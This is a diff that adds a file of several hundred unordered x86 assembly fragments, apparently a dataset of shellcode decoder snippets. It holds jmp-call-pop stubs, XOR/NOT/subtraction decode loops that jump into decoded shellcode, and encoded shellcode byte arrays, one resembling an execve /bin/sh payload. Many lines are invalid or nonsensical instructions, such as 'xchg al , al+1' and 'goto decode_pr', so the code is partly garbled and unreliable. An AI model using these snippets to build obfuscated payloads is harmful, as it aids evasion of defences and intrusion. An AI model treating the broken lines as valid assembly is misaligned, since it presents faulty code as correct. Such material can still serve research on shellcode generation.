@@ -1,0 +1,305 @@
+_start :
+"mov eax , 19"
+_start : \n jmp short call_decoder
+_start : \n jmp call_decoder
+_start : \n jmp call_decoder
+_start : \n jmp short call_decoder
+_start : \n jmp short call_decoder
+_start : \n jmp short call_shellcode
+_start : \n jmp short call_shellcode
+_start : \n jmp short call_shellcode
+_start : \n jmp short enc
+_start : \n jmp short stage
+"add al , 0x2"
+"add al , 3"
+"add byte [esi] , 0x02"
+"add byte [esi] , 0x10"
+"add eax , 4 \n jnz decode"
+"add eax , ebx"
+"add ebp , 0x2"
+"add edi , 2"
+"add esi , 2"
+call decoder
+call decoder
+call decoder_setup
+call returnlabel
+call_decoded :
+call_decoder :
+call_decoder :
+call_decoder :
+call_decoder :
+call_decoder :
+"call_decoder : \n call_decoder 0xeb , 0x25 , 0x5e , 0x31 , 0xc9 , 0xb1 , 0x1e , 0x80 , 0x3e , 0x07"
+call_shellcode :
+call_shellcode
+call_shellcode : \n call_shellcode
+call_shellcode : \n call decoder
+call_shellcode :
+call_shellcode :
+call_shellcode :
+check_even_odd :
+"cmp al , cl \n jne short decode \n jmp shellcode"
+jz shellcode
+"cmp bl , 0xbb \n je xordecode \n jmp notdecode"
+"cmp byte [esi] , 0x88 \n je shellcode"
+"cmp byte bl , bl \n jne not_equal"
+"cmp dword [esi+edx+5] , edi \n je execute_shellcode"
+common_commands : inc esi
+cycle :
+dec al \n jz shellcode
+"sub ebx , 1"
+decode_loop :
+decode_pr :
+decode :
+"mov eax , 27"
+decode :
+"mov eax , 3"
+decode :
+"decode : \n cmp byte [esi] , 0x7 \n jl lowbound \n sub byte [esi] , 0x7 \n jmp common_commands"
+"mov bl , byte [esi]"
+decode : \n not byte [esi]
+"decode : \n sub byte [esi] , 13"
+"decode : \n xor byte [esi] , 0xaa"
+decoded_shellcode : \n call [esp]
+decoder_setup :
+decoder :
+decoder :
+decoder :
+decoder :
+decoder :
+main :
+decoder :
+decoder : \n pop esi
+pop esi
+"pop esi \n mov edi , esi"
+enc : \n call decoder
+"encoded_shellcode : db 0xc0 , 0x31 , 0x68 , 0x50 , 0x2f , 0x2f , 0x2f , 0x68 , 0x73 , 0x2f , 0x68 , 0x69 , 0x62"
+"encoded_shellcode : db 0x545 , 0x4a3 , 0x583 , 0x5d3 , 0x541 , 0x541 , 0x439 , 0x5d3 , 0x5d3 , 0x541 , 0x439 , 0x5d3 ,"
+encoded
+"encoded : dw 0x04 , 0x539 , 0x9d9 , 0x6c9 , 0xfc9 , 0xc49 , 0xc29 , 0x839 , 0xdf9 , 0xc49 , 0xc29 , 0x839"
+encodedshellcode db 0xeb \n
+"db 0x32 , 0x51 , 0x30 , 0x74 , 0x69 , 0x63 , 0x6f , 0xe4 , 0x8a , 0x54 , 0xe2 , 0x8a"
+"encodedshellcode : db 0x43 , 0xed , 0x1d , 0xf4 , 0x40 , 0xfb , 0x6f , 0x7a , 0xa9 , 0xe , 0xb6 , 0xe , 0xc , 0xbc"
+"encodedshellcode db 0xd6 , 0x47 , 0xb7 , 0x9f , 0xd8 , 0xd8 , 0x94 , 0x9f , 0x9f , 0xd8 , 0xa5 , 0x7b"
+"encodedshellcode db 0xeb , 0x0c , 0x5e , 0x31 , 0xc9 , 0xb1 , 0x19 , 0xf6 , 0x16 , 0x46 , 0xe2 , 0xfb"
+"encoder_shellcode : db 0x08 , 0x60 , 0x58 , 0xc8 , 0x39 , 0xb0 , 0xd8 , 0xc3 , 0x9f , 0x9f , 0xd1 , 0xb8 , 0xb7"
+even_number :
+in execute_shellcode jmp short esp
+format :
+formatting :
+get_shellcode_addr :
+global _start
+global _start
+inc dx
+inc eax \n inc eax \n inc eax \n inc eax \n inc eax
+inc eax \n inc eax \n inc eax \n inc eax \n inc eax
+inc ecx \n inc ecx \n inc ecx \n inc ecx \n inc ecx
+inc ecx \n inc ecx \n inc ecx \n inc ecx \n inc ecx
+inc edi
+inc edi
+inc edx \n inc edx
+inc edx \n inc edx \n inc edx \n inc edx \n inc edx
+inc esi
+inc esi \n inc esi
+inc esi \n inc esi
+inc esi
+inc esi \n inc esi
+inc esi \n inc esi
+inc esi \n jmp short decode
+inc_dec :
+jmp decode
+jmp short call_decoder
+go call_shellcode
+jmp short call_shellcode
+jmp short cycle
+jmp short decode
+jmp short decode
+jmp back decode
+goto decode_pr
+jmp short get_shellcode_addr
+jmp short inc_dec
+jmp short main
+go shellcode_section
+jmp short switch
+jz decoded_shellcode
+"lea edi , [edi+2]"
+"lea edi , [esi+13]"
+"lea edi , [esi]"
+"lea edi , [esi]"
+"lea edi , [esi]"
+"lea edi , [esi+0x1]"
+"lea edi , [esi+2]"
+loop check_even_odd \n jmp short shellcode
+loopnz decode
+loop decode \n jmp edx
+loop decode \n jmp short encodedshellcode
+loop decode \n jmp short shellcode
+loop decode routine \n jmp shellcode
+loop decode \n jmp short encodedshellcode
+loopnz decode \n jmp short shellcode
+loop loop \n jmp encoded_shellcode
+lowbound :
+main :
+"mov [edi] , al"
+"mov [edi] , al"
+"xchg al , byte 0x3f"
+"mov al , byte [esi]"
+"mov al , byte [esi]"
+"mov al , byte [esi+1+ebp]"
+"mov al , cl"
+"mov al , dl"
+"mov al , dl"
+"mov ax , [esi]"
+"mov ax , word [edi+1+ecx]"
+"mov bh , bl"
+pop byte [esi+edx+2]
+"mov bl , byte [esi]"
+"mov bl , 0x7"
+"mov bl , 0xff"
+"mov bl , byte [eax]"
+"mov bl , byte [edi+ecx]"
+getbyte bl
+"mov bl , byte [esi+eax+1]"
+"mov bl , byte [esi+eax]"
+"mov bl , byte [esi+edi]"
+pop bl
+"mov bl , byte [esi]"
+"mov bl , byte [esi+eax*1]"
+"mov bl , byte [esi+eax*1+0x1]"
+"mov bl , byte [esi+ecx+1] \n sub bl , 0x7"
+"mov bl , cl"
+"mov bx , [esi]"
+"mov byte dl , eax"
+"mov edi , bl"
+"mov byte [edi] , bl \n not byte [edi]"
+"mov byte [edi] , bl \n xor byte [edi] , 0xdd"
+"mov byte [edx+eax] , bl"
+"mov byte [esi+1] , dl"
+"mov byte [esi+eax] , bl"
+"mov byte [esi] , dl"
+"mov byte [esi+ecx] , bl"
+"mov byte [esp+eax+1] , cl"
+"mov byte [esp+eax+2] , bh"
+"mov byte [esp+eax+3] , bl"
+"mov byte [esp+eax] , ch"
+"mov byte [edx+eax] , bl"
+"mov ch , byte [esi+edx+4]"
+"mov counter , 10"
+"mov cl , 13"
+"mov cl , al"
+"mov cl , byte [eax]"
+"mov cl , byte [esi+edx+3]"
+"mov cl , dl"
+"mov dl , [esi-1]"
+"mov dl , byte [esi]"
+"mov esi , dl"
+"mov dl , 0x45"
+"mov dl , 0xff"
+"mov dl , byte [eax+1]"
+"mov dl , byte [eax]"
+"mov dl , [esi+1]"
+"mov dl , byte [esi+edi+1]"
+"mov dl , byte [esi]"
+"mov eax , edi"
+"mov ecx , ebp"
+"mov edi , 0xaaaa9090"
+"mov edi , shellcode"
+"mov edx , esp"
+"mov word [edi] , ax"
+neg dl \n inc dl
+inc edi \n jmp short formatting
+not byte [esi]
+not_equal :
+notdecode :
+odd_number :
+pop esi
+pop esi
+pop esi
+pop esi
+"pop esi \n mov cx , esi"
+push encoded shellcode
+"push esi \n mov edi , esp"
+returnlabel :
+"rol shellcode , 1"
+"ror bl , cl"
+"ror esi , 1"
+section . text
+shellcode_length equ $-shellcode
+shellcode_section :
+"shellcode : db 0x0e , 0x3a , 0x94 , 0x12 , 0x12 , 0x12 , 0x12 , 0xb2 , 0x9b , 0x37 , 0xc3 , 0x52 , 0xb6 , 0x0e"
+"shellcode : db 0x18 , 0x38 , 0xc7 , 0x57 , 0x6f , 0x36 , 0x36 , 0x7a , 0x6f , 0x6f , 0x36 , 0x69 , 0x6b"
+"shellcode : db 0x31 , 0xc0 , 0x31 , 0xdb , 0x31 , 0xc9 , 0x31 , 0xd2 , 0xb2 , 0xa4 , 0xeb , 0x1f , 0x5e , 0x0b"
+"shellcode : db 0x3e , 0xcd , 0x5d , 0x96 , 0xef , 0x75 , 0x3c , 0x3c , 0x80 , 0x75 , 0x75 , 0x3c , 0x76 , 0x7b"
+"shellcode : db 0x62 , 0x60 , 0xa0 , 0x34 , 0x5e , 0x97 , 0xe6 , 0x34 , 0xd0 , 0x97 , 0xc4 , 0xb4 , 0xdc , 0xdd"
+"shellcode : db 0xbb , 0xec , 0x73 , 0xcc , 0x3f , 0x9d , 0xbb , 0x8d , 0x51 , 0xbb , 0xb5 , 0x1b , 0xbb , 0xb3"
+"shellcode : db 0xc6 , 0x02 , 0x80 , 0x01 , 0x81 , 0x03 , 0xd1 , 0x01 , 0xbe , 0x02 , 0x5f , 0x01 , 0x98"
+"shellcode : db 0xeb , 0x0d , 0x5e , 0x31 , 0xc9 , 0xb1 , 0x19 , 0x80 , 0x36 , 0xaa , 0x46 , 0xe2 , 0x7b"
+"shellcode : db 0xf1 , 0x31 , 0x90 , 0x38 , 0x47 , 0x47 , 0x5c , 0x1b , 0x1b , 0x47 , 0x4d , 0x0"
+shift_decode :
+"shl eax , 28"
+"shl eax , 28"
+"shr ax , 1"
+"shr ax , cl \n not word ax"
+"shr bl , 4"
+"shr dl , 1"
+"shr dl , 4"
+"shr eax , 24"
+"shr eax , 28"
+stage : \n call decoder function
+"sub ax , 13"
+"sub bl , al"
+"sub bl , byte bl"
+"sub byte [esi] , 8 \n not byte [esi]"
+"sub cl , dl"
+"sub dl , al \n jns decode_pr"
+"sub dx , bx"
+"sub esp , 0x7f"
+"sub esp , 0x7f"
+switch :
+jz even_number
+"xchg al , al+1"
+"xor al , bl \n jz short shellcode"
+"xor ax , 0x539"
+"xor ax , bx"
+"xor ax , bx \n jz decoded"
+"xor bh , byte [esi+edx]"
+"xor bl , 0xaa \n jnz encodedshellcode"
+"xor bl , 0xbb \n jz encoded"
+"xor bl , 0xbb \n jz formatting \n mov cl , byte 0xef"
+"xor bl , byte [esi+edx]"
+"xor bl , dl \n jnz short shellcode"
+"xor byte [esi] , 0x88"
+"xor byte [esi] , 0x97"
+"xor byte [esi] , dl"
+"xor byte [esi] , dl"
+"xor byte [esi] , dl"
+"xor [esi+1] , dl"
+"xor ch , byte [esi+edx]"
+"xor cl , 0x32 \n jz short encodedshellcode"
+"xor cl , 0xaa \n jnz next_cycle"
+"xor cl , 0xaa \n jz shift decode"
+"xor cl , byte [esi+edx]"
+"xor dl , 0xbb \n jz next_cycle"
+"xor eax , eax \n mov al , 0x1"
+"xor eax , eax \n mov al , 22"
+"xor ebx , ebx \n mul ebx"
+"xor eax , eax \n xor ebx , ebx \n xor ecx , ecx"
+"xor eax , eax \n xor ebx , ebx \n xor ecx , ecx \n xor edx , edx"
+"xor eax , eax \n xor ebx , ebx \n xor ecx , ecx \n xor edx , edx"
+"xor ebp , ebp"
+"xor ebx , ebx"
+"xor ebx , ebx \n mov bl , [esi+1]"
+"xor ebx , ebx \n xor edx , edx"
+"xor ecx , ecx"
+"xor ecx , ecx \n mov cl , 0x19"
+"xor eax , eax \n mov al , 0x1e"
+"xor ecx , ecx \n mov cl , 23"
+"xor ecx , ecx \n mov cl , 25"
+"xor loop , 0xbb \n mov first byte , shellcode_length"
+"xor ecx , ecx \n mul ecx"
+"xor eax , eax \n xor edx , edx"
+"xor ecx , ecx \n mul ecx"
+"xor ebx , ebx \n mul ebx"
+"xor edi , edi \n xor eax , eax \n xor ebx , ebx \n xor edx , edx"
+"xor edx , ecx \n mov dl , [esi+1]"
+xordecode :
